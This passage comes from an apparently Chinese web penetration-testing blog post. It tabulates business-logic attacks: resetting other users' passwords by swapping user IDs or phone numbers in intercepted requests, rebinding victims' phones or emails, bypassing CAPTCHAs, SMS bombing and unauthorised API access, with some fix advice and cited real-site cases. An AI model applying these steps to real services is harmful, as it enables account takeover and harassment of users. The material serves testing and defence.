<td align="left">通过用户凭证有效性修改密码： <br>1、短信验证码 通过他人手机号找回密码，抓包，将他人手机号替换成自己的手机号，获取验证码，提交后修改密码。 通过自己手机号找回密码，获取验证码后抓包，将数据包中的username改为他人用户名，提交后成功修改他人密码 <br>2、邮箱token 通过邮箱找回密码，访问链接重置密码，输入新密码提交时抓包，虽然有token，但依然可以直接修改用户ID进而修改密码  <br>案例：<br>短信验证码 P2P之通融易贷存在设计缺陷可重置任意用户密码<a href="https://www.uedbox.com/post/19507/">https://www.uedbox.com/post/19507/</a> <br>说明：<br>点击修改密码时抓包，将邮箱号修改为自己的邮箱号，验证码就被发送到自己的邮箱中</td>
</tr>
<tr>
<td align="left">重新绑定手机和邮箱</td>
<td align="left">1、手机绑定： <br>给已知账户绑定手机，发现绑定手机的URL链接中有uid参数，修改uid参数为他人的，即可实现将他人的账户绑定上自己的手机，之后通过手机修改密码 修改个人资料处抓包，修改userId为他人，修改手机号为自己的手机，即可实现将他人的账户绑定上自己的手机，之后通过手机来修改密码  <br><br>2、邮箱绑定： <br>通过邮箱找回密码，URL链接中修改用户ID为他人，邮箱不变，之后通过链接可以将他人账户绑定为自己的邮箱，之后通过邮箱找回密码</td>
</tr>
<tr>
<td align="left">服务器验证</td>
<td align="left">1、最终提交步骤 使用邮箱找回密码，通过链接至修改密码页面，修改密码后提交、抓包，获得Uid参数，修改为他人，即可修改其他用户密码 <br><br>2、服务器验证的验证逻辑为空（绕过认证） 通过密码保护问题找回密码，抓包，将密码保护问题删除，直接修改密码，提交 <br>注：此处密保问题和新密码在同一页面  <br>案例：<br>最终提交步骤 携程旅行网任意用户密码修改说明：通过修改密码邮件，进行密码修改，提交时进行抓包。将Uid改为别人的，即可修改其他人的密码</td>
</tr>
<tr>
<td align="left">修改凭证</td>
<td align="left">修改凭证找回密码的方法 <br>1、修改手机号码 <br>2、修改邮箱地址</td>
</tr>
<tr>
<td align="left">跳过验证</td>
<td align="left">跳过验证步骤、找回方式、直接到设置新密码页面 <br>1、正常流程下，密码找回，查看最后设置新密码页面的URL，记录下来。继续返回密码找回处，输入其他用户名，提交找回申请，直接访问上面记录下的修改密码页面，成功修改密码 <br>2、正常流程下，修改密码页面抓包，修改其中的USERNAME_COOKIE为其他用户（有可能会经过编码，比如base64），提交即可修改其他用户密码，如果抓包其中有step参数，可以修改这个参数为最后一步（比如：5），提交便可略过之前的步骤</td>
</tr>
<tr>
<td align="left">本地验证</td>
<td align="left">1、在本地验证服务器的返回信息，确定是否执行密码重置，但是其返回信息是可控的内容，或者是可以获得的内容 例如：通过手机找回密码，随便输入验证码，抓包，发送，拦截response包（Burpsuite中可以选取do intercept–&gt;response to this request），修改response包中的返回码，继续发送，说不定就可以绕过验证，直接跳到修改密码的页面。 <br>2、发生短信等验证信息的动作在本地执行，可以通过修改request包进行控制 例如：通过用户名找回密码，提交后会自动发送验证码到手机中，抓包，修改手机为自己的手机（如果其中有type之类的参数，也可以尝试修改，有email之类的参数，可以尝试删除内容），发送修改后的包，手机成功接收验证码。输入验证码，继续发送，抓包，如果有type之类的参数，可以继续尝试修改，发送就可以成功修改密码</td>
</tr>
<tr>
<td align="left">Token生成可控</td>
<td align="left">token生成可控 <br>举例： <br>1、通过邮箱找回密码，正常流程下，抓包查看提交验证码后返回的数据，有加密字符串，这个加密字符串和后面重新设置新密码URL链接中的加密字符串一样，所以可以利用这个加密字符串 <br>2、根据上面提交验证码的抓包，修改User为其他用户（User有可能会使用md5加密），发送，就可以返回其他用户的加密字符串 <br>3、重新返回到找回密码首页，利用其他用户找回，点下一步，到输入验证码处，直接修改URL链接，加入加密字符串，可以直接绕过验证码，重置密码</td>
</tr>
<tr>
<td align="left">注册覆盖</td>
<td align="left">注册覆盖 <br>举例： <br>注册重复的用户名，例如admin，相当于修改了密码</td>
</tr>
<tr>
<td align="left">Session覆盖</td>
<td align="left">Session覆盖 <br>举例： <br>同一浏览器，首先输入自己的账户进行邮箱密码找回，进入邮箱查看链接，接着输入他人账户，进行密码找回，返回刚刚自己的邮箱点击链接，由于session覆盖导致了，这个链接成为了修改他人密码的链接，成功修改他人密码</td>
</tr>
</tbody></table>
<h1 id="六、验证码突破"><a href="#六、验证码突破" class="headerlink" title="六、验证码突破"></a>六、验证码突破</h1><p>验证码突破方法</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">暴力破解</td>
<td align="left">方法 <br>1、有的验证码输入正确一次，在一定时间内不用再输入。 <br>2、有的验证码输入正确一次，会在你session中设定一个值，告诉服务器你已经通过验证码验证了。 <br>3、有的验证码因为逻辑问题只是一个摆设，正常的逻辑为先对比验证码是否正确，再检测账号密码是否正确，反过来了 <br>4、删除cookie，将验证码参数va=1234变成va[]=1234  <br><br>修复建议： <br>1、提高验证码的长度、复杂度 <br>2、可限制错误登录次数、有效时间突破验证码的方法</td>
</tr>
<tr>
<td align="left">时间、次数突破</td>
<td align="left">概念： <br>重复提交携带验证码的数据包，查看返回包，判断次数 <br><br>测试方法：<br>填写正确登录信息和验证码–&gt;抓取提交数据包–&gt;重复提交该数据包–&gt;查看是否登录成功–&gt;登录成功则存在验证码重复使用问题  <br><br>案例： <br>Step1、输入正确信息点击登录时抓包 <br>Step2、抓包，通过修改imageField参数的大小来实现暴力提交，自设一个两位数数字字典作为payload<br>Step3、查看任意响应包是否登录成功，从结果来看，暴力重复提交的数据包均登录成功。</td>
</tr>
<tr>
<td align="left">回显测试</td>
<td align="left">概念： <br>验证码直接由客户端生成，在回显中显示，可通过浏览器工具直接查看 <br><br>测试方法： <br>1、在源码中显示。源代码审计，搜索源码中有无验证码 <br>2、在COOKIE中显示。抓包时分析COOKIE中是否含有验证码 <br>案例： <br>Step1、输入相关信息 <br>Step2、抓包，得到验证码 <br>Step3、输入验证码。验证通过</td>
</tr>
<tr>
<td align="left">绕过测试</td>
<td align="left">漏洞成因：<br>由于逻辑设计缺陷，可绕过验证，比如直接删除COOKIE或验证码参数可绕过、当验证不通过清空session时，验证码参数值为空时绕过等。 <br><br>测试方法： <br>1、抓包，删除验证码字段，查看是否可以成功发送 <br>2、抓包，正常流程下，记录验证码后的数据包，替换目标包中内容，直接发送，查看是否可以直接绕过验证码 <br><br>案例： <br>Step1、输入正确账户信息和错误验证码，登录时抓包 <br>Step2、删除COOKIEStep3.客户端登陆成功</td>
</tr>
</tbody></table>
<h1 id="七、接口调用安全"><a href="#七、接口调用安全" class="headerlink" title="七、接口调用安全"></a>七、接口调用安全</h1><table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">重放攻击</td>
<td align="left">在短信、邮件调用业务或生成业务数据环节中（类：短信验证码，邮件验证码，订单生成，评论提交等），对其业务环节进行调用（重放）测试 <br><br>常见类型： <br>短信轰炸（末尾空格、\n绕过） <br>恶意注册  <br><br>修复： <br>1、对评论提交等操作采用验证码机制，防止生成数据业务被恶意调用； <br>2、短信/邮件接口，需要对接调用频率进行控制或者上限限制； <br>3、每一个订单（接口访问）使用唯一的token，提交一次后，token失效</td>
</tr>
<tr>
<td align="left">内容编辑</td>
<td align="left">例如： <br>点击获取短信验证码，抓包，可以修改短信内容，实施下一步攻击  <br><br>修复： <br>从客户端处获取手机号、邮箱等账号信息，要与Session中的凭证进行核验，验证通过后才允许进行业务操作。</td>
</tr>
<tr>
<td align="left">接口调用遍历漏洞</td>
<td align="left">Web接口一般将常见的一些功能需求进行封装，通过传入不同的参数来获取对应的数据或者执行相应的功能，其中最常见的场景就是通过接口传入id参数，返回对应id的信息。此类接口如请求合法性校验不严，很容易出现非授权访问或者越权访问的问题。  <br><br>修复： <br>1、在session中存储当前用户的凭证或者id，只有传入凭证或者id参数值与session中的一致才返回结果。 <br>2、一般涉及身份校验的接口，不要直接将敏感信息的明文信息在客户端与服务端间传递，可以将敏感信息在服务端关联到用户标识ID，在客户端保存用户标识ID并提交到服务端，服务端根据ID取出对应信息后进行校验；</td>
</tr>
<tr>
<td align="left">接口未授权访问、调用漏洞</td>
<td align="left">在正常的业务中，敏感功能的接口需要对访问者的身份进行验证，验证通过后才允许调用接口进行操作。接口未做身份验证或身份校验不严，可能导致非授权访问或越权调用，越权又分为垂直越权和水平越权。  <br><br>修复： <br>1、采用Token校验的方式，在url中添加一个Token参数，只有Token验证通过才返回接口数据且Token使用一次后失效； <br>2、在接口被调用时，服务器端对会话状态进行验证，如果已经登录，便返回接口数据；如未登录，则返回自定义的错误信息； <br>3、未授权访问接口做Session认证，并对用户访问的每一个URL做身份鉴别，正确的校验用户id及token等； <br>4、服务器端需校验身份唯一性，访问接口来源验证，不同身份只能查看修改删除添加自己的信息。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>逻辑漏洞</tag>
      </tags>
  </entry>
</search>
